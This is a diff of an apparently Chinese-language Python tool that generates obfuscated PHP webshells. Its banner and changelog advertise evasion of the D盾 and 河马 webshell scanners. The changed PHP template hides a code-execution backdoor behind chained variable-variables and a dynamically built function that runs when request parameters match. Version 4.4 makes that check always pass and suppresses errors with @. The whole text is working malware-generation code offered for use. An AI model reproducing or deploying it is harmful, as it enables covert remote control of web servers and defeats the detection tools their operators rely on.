@@ -113,19 +113,19 @@ def free_kill(php_name):
     $p_2 = "{keys}";
     $p_3 = $base($rep("{ph_2[1]}", "", "{ph_2[0]}"));
      """ + """
-    if($_GET['a'] > $_GET['b'] and $_POST['c'] !== $_POST['d']){//比对错误的返回值
-        if(md5($_GET['c'])=== md5($_GET['d'])){
-            $value1 = $p_1;
-            $$value1 = $p_2;
-            $zh=$value1.$$value1;
-            $value2=$zh;
-            $$value2=$p_3;
-            $namex=$value2;
-            $namez=$$value2;
+    if($_GET['a'] > $_GET['b'] && $_POST['c'] !== $_POST['d']){//比对错误的返回值
+        if(@md5($_POST['c']) === @md5($_POST['c'])){
+            @$value1 = $p_1;
+            @$$value1 = $p_2;
+            @$zh=$value1.$$value1;
+            @$value2=$zh;
+            @$$value2=$p_3;
+            @$namex=$value2;
+            @$namez=$$value2;
             @$n = $func('$echo1,$echo2','return "$echo1"."$echo2";');
-            $n1=$n($namex,$namez);
+            @$n1=$n($namex,$namez);
             @$p = $func("", $n1);
-            $p();
+            @$p();
         }
     }
     ?>
@@ -316,7 +316,7 @@ error was encountered while trying to use an ErrorDocument to handle the request
 
 
 if __name__ == "__main__":
-    name = colored('webshell_bypass_php_4.2 by 弱鸡', 'green')
+    name = colored('webshell_bypass_php_4.4 by 弱鸡', 'green')
     name = name + "\n\n交流群：655934283\n\n\n\ngithub：https://github.com/ytMuCheng/ruoji"
     arg = ArgumentParser(description=name)
     arg.add_argument("-p",
@@ -344,7 +344,7 @@ if __name__ == "__main__":
                 xt = 'windows'
             print(f"""
             |---------------------------------------
-            |{colored('php_弱鸡_webshelll免杀生成 4.3', 'red')}
+            |{colored('php_弱鸡_webshelll免杀生成 4.4', 'red')}
             |密码随机                            
             |伪装1和3适用于linux服务器
             |伪装2适用于iis服务器
@@ -361,7 +361,8 @@ if __name__ == "__main__":
             |版本4.0: 修复了使用错误
             |        4.1: 修改了报错问题
             |        4.2: 绕过d盾牌检测
-            |        4.3: 绕过河马检测，并添加了严格的密码验证 
+            |        4.3: 绕过河马检测，并添加了严格的密码验证
+            |        4.4：修复了代码逻辑问题，并添加了@，防止报错
             |---------------------------------------
             |配置信息
             |默认生成shell文件路径：{path}
